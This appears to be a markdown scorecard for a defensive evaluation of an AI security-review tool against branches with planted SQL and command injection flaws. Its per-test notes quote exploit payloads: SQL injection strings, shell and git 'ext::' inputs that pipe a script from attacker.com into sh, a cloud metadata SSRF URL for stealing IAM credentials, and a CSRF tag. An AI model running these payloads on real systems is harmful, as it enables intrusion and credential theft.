# `/security-review` evaluation — scorecard

Phase 1 scope: **Claude-only.** Cross-model comparison (Claude vs ChatGPT)
is deferred to phase 2.

One row per test branch. Each `vuln/<class>` branch gets a PR against
`main`; the GitHub Actions workflow runs `/security-review` automatically
and posts findings as PR comments. Ground truth per class lives at
[`eval/expected/<class>.md`](./expected/).

Columns:
- **Flagged:** TP = caught (true positive); FN = missed (false negative).
  Parenthetical count = number of distinct findings reported for the class.
- **Severity (expected -> got):** compare claim vs ground truth.
- **Fix quality:** Good / Partial / Wrong / None — does the suggested
  remediation actually fix the bug, is it minimal, no new issues?
- **False positives:** anything flagged in this run that isn't a real issue.
- **Bonus findings:** true positives the review caught that weren't the
  planned vuln for this branch (e.g., missing auth, logging a secret).

## Summary

| # | Class | Branch | PR | Flagged | Severity (expected -> got) | Fix quality | False positives | Bonus findings | Notes |
|---|---|---|---|---|---|---|---|---|---|
| 1 | SQL injection | `vuln/sql-injection` | [#1](https://github.com/DrivetrainAi/test-security/pull/1) | TP (2) | HIGH -> HIGH | Good | 0 | Missing auth on `/users/search-advanced` | Caught both `filter` and `orderBy` sinks as separate findings; noted the sibling `findByName` correctly uses parameterized queries |
| 2 | Command injection | `vuln/command-injection` | [#3](https://github.com/DrivetrainAi/test-security/pull/3) | TP (1) | HIGH -> HIGH | Good | 0 | Missing auth on `/ops/ping` | Caught `Runtime.exec` concatenation; flag-injection variant pre-empted in exploit scenario (`host=-c+1000+...`); recs include hostname allowlist regex, ProcessBuilder array form, and `InetAddress.isReachable()` as architectural alternative |
| 3 | Path traversal | `vuln/path-traversal` | — |  |  |  |  |  |  |
| 4 | Insecure deserialization | `vuln/deserialization` | — |  |  |  |  |  |  |
| 5 | XXE | `vuln/xxe` | — |  |  |  |  |  |  |
| 6 | Hardcoded credentials | `vuln/hardcoded-secrets` | — |  |  |  |  |  |  |
| 7 | Weak crypto | `vuln/weak-crypto` | — |  |  |  |  |  |  |
| 8 | SSRF | `vuln/ssrf` | — |  |  |  |  |  |  |
| 9 | XSS | `vuln/xss` | — |  |  |  |  |  |  |
| 10 | Log injection | `vuln/log-injection` | — |  |  |  |  |  |  |
| 11 | Command injection — argv (depth probe) | `vuln/command-injection-argv` | [#4](https://github.com/DrivetrainAi/test-security/pull/4) | TP (3) | HIGH -> HIGH | Good | 0 | SSRF and auth-bypass as their own structured findings; CSRF-via-GET reasoning | Explicitly rebutted the "safe from injection" docblock; named both `ext::` transport and `--upload-pack=` flag injection; recommended `--` separator + scheme allowlist + `protocol.ext.allow=never` env hardening |
| — | Negative controls | `safe/negative-controls` | — | n/a — should stay quiet |  | n/a |  | n/a |  |

### Running tally (3 of 11 complete)

- **True positives:** 3 / 3
- **False negatives:** 0 / 3
- **Severity accuracy (got == expected):** 3 / 3
- **Fix quality == Good:** 3 / 3
- **False positives on `safe/negative-controls`:** branch not yet built
- **Bonus TPs caught:** missing-auth on all 3 endpoints (consistent contextual reasoning); SSRF + CSRF-via-GET on test #11

### Aggregate scores (final, fill in once all 11 vuln runs are complete)

- **True positives:** _ / 11
- **False negatives:** _ / 11
- **Severity accuracy (got == expected):** _ / 11
- **Fix quality == Good:** _ / 11
- **False positives on `safe/negative-controls`:** _

---

## Per-test notes

### 1. SQL injection — `vuln/sql-injection` (PR [#1](https://github.com/DrivetrainAi/test-security/pull/1))

**Expected** (see [`eval/expected/sql-injection.md`](./expected/sql-injection.md)):
- `UserDao.findByFilter` concatenates the `filter` parameter into a raw SQL
  WHERE clause — classic string-concatenation SQL injection.
- `UserDao.findByFilter` also concatenates `orderBy` into the ORDER BY
  clause — second SQL injection sink in the same method.
- Expected severity for both: **HIGH**.

**Actual — findings from the workflow's PR comment:**

1. **`filter` -> WHERE clause** — HIGH — category `sql_injection`.
   Claude explicitly contrasted against the sibling `findByName` (which uses
   `?` placeholders correctly) and called out that `/users/search-advanced`
   is reachable with no auth (Spring Security absent). Exploit scenario:
   `/users/search-advanced?filter=1=1 UNION SELECT password FROM users--`
   -> UNION-based exfiltration. Recommendation: query-builder / criteria API
   with allowlisted fields and parameterized predicates; at minimum put the
   endpoint behind auth + parameterize.

2. **`orderBy` -> ORDER BY clause** — HIGH — category `sql_injection`.
   Reasoned correctly that ORDER BY injection is normally lower-impact but
   in this project the H2 database supports stacked queries, escalating it
   to full SQLi. Exploit scenario: blind SQLi via
   `orderBy=(CASE WHEN (SELECT substring(password,1,1) FROM users LIMIT 1)='a' THEN name ELSE username END)`.
   Recommendation: allowlist of permitted column names with concrete code
   (`Map<String, String> ALLOWED = Map.of("name","name","username","username"); String safeOrder = ALLOWED.getOrDefault(orderBy, "name");`).

**Score:**
- Flagged: TP on both sinks (distinct findings).
- Severity: HIGH == HIGH on both. Accurate.
- Fix quality: **Good.** Concrete, minimal, idiomatic. Bonus points for
  the ORDER BY allowlist code snippet and the H2-stacked-queries reasoning.
- False positives: 0.
- Bonus findings: missing authentication / authorization on
  `/users/search-advanced`. Out-of-scope for the planned vuln but a real
  true positive — the kind of contextual finding that matters.

**Links:**
- PR: https://github.com/DrivetrainAi/test-security/pull/1
- Review comment: see PR conversation

### 2. Command injection — `vuln/command-injection` (PR [#3](https://github.com/DrivetrainAi/test-security/pull/3))

**Expected** (see [`eval/expected/command-injection.md`](./expected/command-injection.md)):
- `NetworkOpsController.ping` invokes `Runtime.getRuntime().exec("ping -c 2 " + host)` —
  user-controlled `host` concatenated into a single-string exec call.
- Endpoint `/ops/ping` is unauthenticated (no Spring Security).
- Expected severity: **HIGH**.

**Actual — finding from the workflow's PR comment:**

1. **`host` -> Runtime.exec single-string** — HIGH — category `command_injection`.
   Reasoning correctly distinguished the `exec(String)` whitespace-tokenization
   semantics (no shell on most JVMs) from the practical risk: argument
   injection to `ping`, plus shell delegation on certain JDKs/JREs when
   metacharacters are present. Exploit scenarios offered:
   - `?host=127.0.0.1%0acat%20/etc/passwd` — newline + shell delegation case
   - `?host=;curl+attacker.com/shell.sh|sh` — shell metacharacter chain
   - `?host=-c+1000+127.0.0.1+-s+65500` — pure flag injection (DoS via
     ping flood / large packets), no shell required
   Spotted that `/ops/ping` is unauthenticated and that the TODO on line 14
   confirms it is intentionally not yet locked down. Recommendations:
   1. Strict hostname regex allowlist (`^[a-zA-Z0-9.\-]+$`) — this is the
      actual fix that closes the bug.
   2. Use the array form of ProcessBuilder
      (`new ProcessBuilder("ping", "-c", "2", host)`).
   3. Add auth/authz immediately, even behind a VPN.
   4. Consider whether `InetAddress.isReachable()` would suffice instead of
      shelling out.

**Score:**
- Flagged: TP — caught with the right CWE class.
- Severity: HIGH == HIGH. Accurate.
- Fix quality: **Good.** Hostname regex allowlist is the right minimal fix;
  `InetAddress.isReachable()` is an excellent architectural alternative.
  Minor inconsistency: the recommendation to "use the array form of
  ProcessBuilder" is presented as a fix, but Claude's own exploit scenario
  (`host=-c+1000+...`) shows the array form is still flag-injectable. Did
  not warn about that gap when recommending it. Test #11 (variant C) will
  probe whether Claude catches the flag-injection-on-array-form pattern
  when presented in isolation.
- False positives: 0.
- Bonus findings: missing authentication on `/ops/ping` — consistent with
  the same bonus call on PR #1, suggesting reliable contextual reasoning
  about endpoint exposure.

**Links:**
- PR: https://github.com/DrivetrainAi/test-security/pull/3
- Review comment: see PR conversation

### 3. Path traversal — `vuln/path-traversal`

Not yet implemented.

### 4. Insecure deserialization — `vuln/deserialization`

Not yet implemented.

### 5. XXE — `vuln/xxe`

Not yet implemented.

### 6. Hardcoded credentials — `vuln/hardcoded-secrets`

Not yet implemented.

### 7. Weak crypto — `vuln/weak-crypto`

Not yet implemented.

### 8. SSRF — `vuln/ssrf`

Not yet implemented. Note: PR #4 surfaced an SSRF finding on the
`vuln/command-injection-argv` branch as a bonus TP — the planned dedicated
SSRF test should still be run separately so we can score on a clean,
single-class branch.

### 9. XSS — `vuln/xss`

Not yet implemented.

### 10. Log injection — `vuln/log-injection`

Not yet implemented.

### 11. Command injection — argv (depth probe) — `vuln/command-injection-argv` (PR [#4](https://github.com/DrivetrainAi/test-security/pull/4))

**Expected** (see [`eval/expected/command-injection-argv.md`](./expected/command-injection-argv.md)):
- `GitMirrorController.mirror` invokes `git clone <url> /tmp/mirror` via
  `ProcessBuilder` argv list — user-controlled `url` is one argv element.
  The docblock explicitly claims the array form makes this safe, which is
  the bait this test exists to challenge.
- Expected severity: **HIGH**.
- Expected reasoning depth: review must explicitly rebut the "safe from
  injection" claim AND name at least one specific flag-injection vector
  (`--upload-pack=...` or `ssh://-oProxyCommand=...` family or `ext::`
  transport) to count as a deep-pass; otherwise it's a partial pass.

**Actual — three findings from the workflow's PR comment:**

1. **RCE via git `ext::` transport + `--upload-pack` argument injection** —
   HIGH — category `command_injection`. Directly rebuts the docblock:
   *"The Javadoc's claim that 'the URL is just data to git' is incorrect —
   git actively interprets URL schemes and option-like arguments."*
   Exploit scenarios:
   - `?url=ext::sh -c curl attacker.com/shell.sh|sh` invoking the `ext::`
     transport handler. Cites git's `protocol.ext.allow=user` policy
     (which permits `ext::` when on the command line).
   - `?url=--upload-pack=id` injecting an option that overrides the
     upload-pack program, executing arbitrary commands when `/tmp/mirror`
     already exists from a prior clone.
   Recommendations: scheme allowlist + reject leading `-`; `--` separator
   before positional args (`new ProcessBuilder("git", "clone", "--", url, "/tmp/mirror")`);
   environment hardening (`GIT_TERMINAL_PROMPT=0`, `-c protocol.ext.allow=never`).

2. **SSRF via unconstrained URL** — HIGH — category `ssrf`. Exploit
   scenarios: AWS instance metadata
   (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`)
   to steal IAM creds via git's combined stdout/stderr in the response
   body; internal-port probing via differential error messages;
   `file:///` scheme for local filesystem. Recommendations: HTTPS-only
   scheme, host allowlist (github.com, gitlab.com), block RFC 1918 +
   link-local + localhost.

3. **Unauthenticated dangerous endpoint / authorization bypass** —
   HIGH — category `authorization_bypass`. Notes there's no Spring
   Security in the project; cites the TODO on line 20. Adds CSRF angle:
   *"Since this is a GET endpoint, it can also be triggered via CSRF —
   `<img src='https://target/ops/mirror?url=ext::malicious'>`"*.
   Recommendations: `@PreAuthorize("hasRole('ADMIN')")`, switch to POST
   for state-changing operations.

**Score:**
- Flagged: TP — depth-pass on the planted vuln + 2 separate structured
  bonus findings.
- Severity: HIGH == HIGH on the planted finding. Accurate.
- Fix quality: **Good.** The `--` separator + scheme allowlist + env
  hardening combination is the most thorough remediation we've seen in
  the run so far. The CSRF-via-GET observation on the auth finding is
  sophisticated and not telegraphed by the source code.
- False positives: 0.
- Bonus findings: SSRF (will overlap with the planned dedicated SSRF
  branch) and authorization-bypass (consistent with the running pattern).

**Links:**
- PR: https://github.com/DrivetrainAi/test-security/pull/4
- Review comment: see PR conversation

### Negative controls — `safe/negative-controls`

Not yet implemented. Will include safe-but-suspicious-looking code
(parameterized queries, `SecureRandom`, properly escaped output,
hardened `DocumentBuilderFactory`, allowlisted URL fetch, etc.).

---

## Methodology

- One vulnerability per feature branch, branched off `main`.
- Each branch opens a PR against `main` so the GitHub Actions workflow
  (`.github/workflows/claude-security.yml`) runs `/security-review`
  automatically and posts findings as PR review comments.
- Ground truth per class lives at [`eval/expected/<class>.md`](./expected/) —
  {file, line, sink, expected severity} for each planted bug.
- Results recorded here before moving on to the next class.
- Vulnerabilities are **not** merged into `main` — branches stay open (or
  closed without merge) so `main` stays clean.
- Re-running after a fix commit is optional per class to confirm a clean pass.
